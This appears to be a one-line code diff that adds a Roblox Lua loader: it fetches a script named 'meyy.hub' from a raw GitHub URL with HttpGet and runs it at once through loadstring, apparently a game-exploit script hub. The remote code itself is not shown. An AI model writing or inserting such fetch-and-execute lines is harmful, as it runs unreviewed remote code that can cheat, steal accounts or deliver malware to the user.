@@ -1,1 +1,2 @@
-cte
+loadstring(game:HttpGet("https://raw.githubusercontent.com/naa-aneex211/-/refs/heads/main/meyy.hub"))()
+
